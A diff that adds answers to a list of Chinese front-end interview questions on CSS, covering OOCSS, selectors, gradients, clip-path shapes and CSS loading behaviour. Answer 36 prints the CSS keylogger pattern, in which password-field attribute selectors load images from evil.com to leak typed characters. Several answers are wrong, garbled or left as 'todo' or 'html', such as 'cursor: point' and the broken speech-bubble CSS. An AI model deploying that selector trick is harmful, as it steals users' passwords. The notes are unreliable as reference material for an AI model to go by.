@@ -892,8 +892,400 @@ css题目（50）
 
 # 3、 你知道什么是面向对象的css（oocss）吗？有没有实践过？
 
+oocss(Object Oriented CSS)不是一种技术也不是一种语言，它是一种css的书写方法，其核心是用最简单的方式编写最整洁的css代码，使代码更具重用性、可维护性和可拓展性。
+OOCSS的两条主要准则：
+1.结构和皮肤分离;
+2.容器和内容分离;
+
+比如一些常用的字体大小、padding、margin值等可以封装为公共样式，html中引用多个类似的类名达到UI效果，减少特性css的代码量
+.text-12{ font-size: 12px; } .text-14{ font-size: 14px; } .text-16{ font-size: 16px; }
+
+# 4、OOCSS有哪些好处？对应的库有哪些？
+
+有语义的类名，逻辑性强的层次关系
+可重用，样式和结构的分离，容器和内容的分离
+Kite
+
+# 5、flex布局的缺点有哪些？（除兼容性外）
+
+  无法直接定义列数(要使用百分比的方式实现)
+  item 如果有多行的话，grid 要比 flex 方便
+
+# 6、CSS中哪些属性会引起GPU渲染，会增加耗电吗？
+
+transform
+
+opacity
+
+filter
+
+will-change
+
+# 7、如何在白天和黑夜自动切换页面的颜色？
+
+@media (prefers-color-scheme: dark)
+
+媒体查询的内容都是设备的属性：宽度高度，旋转方向，打印样式，分辨率
+借助 js 切换页面颜色的话，那就是
+
+    获取地理位置
+    查询日出日落时间
+    根据时间修改全局 theme
+
+# 8、如何给文字的color设置渐变
+
+html
+
+# 9、为什么说css中能用子代选择器的时候不要用后代选择器？
+
+> 作用于元素的第一代后代，空格作用于元素的所有后代
+
+子代选择器：
+h1 > strong {color:red;}
+
+后代选择器：
+h1 元素中的 em 元素应用样式
+h1 em {color:red;}
+
+选择从右到左依次解析匹配，所以后代选择器会去找它的所有父级，
+而子代选择器只会选择直接的父级；减少匹配次数，提高效率
+
+# 10、你有没有使用过“形似猫头鹰”（例：* + *{ ... }） 的选择器？
+
+表示和当前li同级的所有li标签。不包括父级li和子级li。
+
+li + li {
+  margin-top: 1rem;
+}
+
+==>
+
+li:not(:first-of-type) {
+  margin-top: 1rem;
+}
+
+# 11、用css画一个五边形和一个六边形
+
+五边形：clip-path: polygon(50% 0%, 100% 38%, 82% 100%, 18% 100%, 0% 38%);
+
+六边形：clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
+
+七边形：clip-path: polygon(50% 0%, 90% 20%, 100% 60%, 75% 100%, 25% 100%, 0% 60%, 10% 20%);
+
+clip-path 
+
+# 12、使用纯css来创建一个滑块
+
+https://github.com/haizlin/fe-interview/issues/1982
+
+# 13、使用css3实现一个斑马线的效果
+
+水平
+{
+  background: linear-gradient(#fb3 33.3%, #58a 0, #58a 66.6%, yellowgreen 0);
+  background-size: 100% 45px;
+}
+
+<!-- 方向，开始颜色、开始位置，结束颜色、结束位置 -->
+
+垂直 
+{
+  background: linear-gradient(to right, #fb3 50%, #58a 0);
+  background-size: 100% 45px;
+}
+
+45度斜条纹
+{
+  background: linear-gradient(45deg, #fb3 50%, #58a 0);
+  background-size: 45px 45px;
+}
+
+{
+  background: linear-gradient(45deg, #fb3 50%, #58a 0);
+  background-size: 45px 45px;
+}
+
+更好的斜条纹：
+
+{
+  background: repeating-linear-gradient(45deg, #fb3 50%, #58a 0);
+}
+
+{
+  background: repeating-linear-gradient(45deg, #fb3 50%, #58a 0);
+  background-size: 45px 45px;
+}
+
+同色条纹
+{
+  background: #58a;
+  background-image: repeating-linear-gradient(30deg,
+    hsla(0,0%,100%,1),
+    hsla(0,0%,100%,1) 15px,
+    transparent 0, transparent 30px
+  );
+}
 
 
+# 14、如何使用css实现跨浏览器的最小高度？
+
+todo
+
+# 15、怎么设置可点击的元素上强制手型？
+
+cursor: point
+
+# 16、使用css实现悬浮提示文本
+
+html
+
+# 17、如何禁用移动的选择高亮？
+
+user-select: none;
+
+tap-highlight-color: rgba(0,0,0,0);
+
+tap-highlight-color: transparent;
+
+# 18、颜色hsla的字母分别表示什么？
+
+hsla: 不透明度
+
+h：色度
+s：饱和度
+l：亮度
+a：透明度
+
+# 19、说说你对table-layout的理解，它有什么运用场景？
+
+table-layout的值为 fixed的时候，单元格的宽度只与表格，单元格的宽度有关，与内容无关
+
+table-layout的值为 auto的时候，单元格的宽度为当前列最长行有的宽度来计算
+
+如果想要一个table固定大小，里面的文字强制换行，以达到过长文字不撑破表格的目的，一般用table-layout：fixed
+
+# 20、怎么使用css选择空链接？
+
+html
+
+# 21、如何隐藏没有静音、自动播放的音视频？
+
+- 浏览器已经禁止打开网页时自动播放，可以用iframe 先播放触发播放权限，然后再播放
+- opacity: 0
+
+# 22、使用css实现对话气泡的效果
+
+长方椭圆 + 三角型
+
+:after{ 
+  content: '',
+  width: 0;
+  height: 0;
+  margin: 100px auto;
+  border-top: 50px solid transparent;
+  border-left: 50px solid transparent;
+  border-right: 50px solid transparent;
+  border-bottom: 50px solid red;  border-bottom: trantent ;
+}
+
+# 23、你有使用过css的writing-mode属性吗？说说它有哪些应用场景？
+
+用过，该属性可以使文字竖直排列，比如在网页上展示春联
+
+horizontal-tb 水平
+
+vertical-rl 垂直
+
+# 24、css中Scroll-behavior属性有什么应用场景？
+
+手动锚点或者调用api进行页面滚动的时候，Scroll-behavior属性可以为滚动框设定滚动行为，
+auto 表示要立即滚动到指定位置， smooth则表示要平滑过渡，
+
+# 25、scroll-snap-align属性的应用场景是什么？
+
+这个属性设置后，会一个块被滚了一部分中途松手了之后，页面自动滚回去或者滚到下一个块
+
+使用：
+
+ul {
+  scroll-snap-type: y mandatory;
+}
+
+li {
+  scroll-snap-align: start; // end center
+}
+
+
+# 26、如何用css实现把“我不爱996”变成“699爱不我”？
+
+direction: rtl;
+unicode-bidi:bidi-override;
+
+# 27、举例说明你对指针事件（pointer-events）的理解
+
+pointer-events css属性指定在什么情况下，某个特定的图形元素可以成为鼠标事件的target
+当 pointer-events 为 none 时，比如 a 链接不再生效；
+
+# 28、鼠标事件css的:hover和js的mouseover有什么区别？
+
+
+    :hover为CSS伪类，mousehover为JS DOM事件。
+
+    CSS只能改变元素样式，JS既可以改变元素样式又可以改变元素中的内容。
+
+    :hover当鼠标移出后恢复之前的样式，mouseover需要结合mouseout才能恢复之前的样式
+
+    同等效果下，从性能上讲，:hover优于mousehover
+
+    水平有限只能想到这些，希望能抛砖引玉，向大牛们多多学习
+
+
+# 29、使用css的attr()写一个类似a标签title的提示框
+
+html
+
+# 30、举例说明如何从html元素继承box-sizing？
+
+*, *::before, *::after {
+  box-sizing: inherit;
+}
+
+html {
+  box-sizing: border-box;
+}
+
+# 31、异步加载CSS的方式有哪些？
+
+旧：
+js动态插入link标签
+
+在link标签上设置media属性为低优先级的 print,文档渲染后改为screen
+
+新:
+<link rel="preload" href="cssfile.css" as="style" onload="this.rel='stylesheet'">
+改rel值，只有谷歌完美兼容
+
+# 32、css的加载会阻塞DOM树解析和渲染吗？为什么？
+
+css加载不会阻止dom数的解析，但是会阻止dom树的渲染，因为css下载完成后解析成cssom与dom生成渲染数后，页面才会渲染，绘制出来
+
+# 33、css的加载会阻塞js运行吗？为什么？
+
+会阻塞js的运行，因为js可能会去获取或者改变元素样式，所以浏览器为了不重复渲染，等所有css加载渲染完成后再执行js
+
+# 34、为了减小css文件的大小，怎么去除无用css呢？有哪些方法？
+
+使用 purgeCss 插件进行清理
+
+# 35、在一个项目里，你是如何组织(架构)css代码的？
+
+todo
+
+# 36、使用纯css能否监控到用户的一些信息？怎么实现？
+
+可以，著名的css keylogger：
+
+input[type="password"][value$="a"] {
+  background-image: url("http://evil.com/api/a");
+}
+
+input[type="password"][value$="b"] {
+  background-image: url("http://evil.com/api/b");
+}
+
+input[type="password"][value$="c"] {
+  background-image: url("http://evil.com/api/c");
+}
+
+# 37、请使用css3实现图片的平滑转换
+
+以全局监听的方式通过 a 标签的描点进行 view 动态切换页面，只要把 a 标签带有 id 的 href 属性的值指到锚点，用 CSS3 的动画进行切换页面.
+
+# 38、使用css画个钟表的时间刻度
+
+思路：定义一个钟表的大小位置，用absolute
+
+从 1点到12点用 ul li，每个li用 nth-child 来控制位置，角度用transform，然后分钟的刻度也是照样子分别控制位置，要用48个li
+
+# 39、ui设计中px、pt、ppi、dpi、dp、sp之间的关系？
+
+px 电子屏幕上组成一幅图画或者照片的基本单元
+pt 英寸
+ppi 英寸像素数
+dpi 每英寸多少点
+dp 安卓开发用的长度单位
+sp 安卓开发用的字体大小单位
+
+# 40、举例说明shape-outside的属性的用途有哪些？
+
+shape-outside 定义了一个可以是非矩形的形状，相邻的内联内容应围绕该形状进行包装 
+
+shape-outside：circle() 属性可以实现文字圆形环绕图片效果
+
+# 41、用css3画出一个立体魔方
+
+todo
+
+# 42、如何重写行内样式？方法有哪些（至少两种）？
+
+1、！important
+2、var divStyle = document.querySelector('#div').style // 修改属性
+
+# 43、有哪些标签是不支持伪元素的？
+
+伪元素有：
+
+::after 
+::before
+::first-letter
+::first-line
+
+::selection
+::backdrop
+
+img input iframe 不支持这样用的，因为需要这些元素是可以插入内容的
+
+
+# 44、请使用纯css实现波浪效果
+
+todo
+
+# 45、请问class与[class=xxx]的区别是什么？两者是否等价？
+
+不等价
+class是类选择器，可以作用于任何dom元素
+[class=xxx]是属性选择器，只能作用于特定类型的dom元素
+
+# 46、为什么说对opacity进行动画要比box-shadow进行动画性能更好呢？
+
+opacity不会影响布局，也需要重绘
+
+# 47、能不能使用纯css使你的浏览器卡死？怎么实现？
+
+可以，用计算属性calc、变量
+
+# 48、如何使用css实现鼠标跟随？
+
+其实很多 CSS 效果，都离不开 障眼法 二字。要监测到当前鼠标处于何处，我们只需要在页面上铺满元素即可：
+
+https://www.php.cn/css-tutorial-453627.html
+
+# 49、你有使用过css的属性background-blend-mode吗？说说它的运用场景有哪些？
+
+背景混合模式
+
+可以是背景图片与背景图片的混合，
+
+也可以是背景图片和背景色的之间的混合。
+
+https://blog.csdn.net/dwb123456123456/article/details/84563367
+
+# 50、用css3实现文字发光的效果
+
+text-shadow：0 0 10px #fff,
+0 0 20px #fff,
+0 0 30px #fff,
+0 0 40px #00a67c,
 
 周级综合题目（50）
 
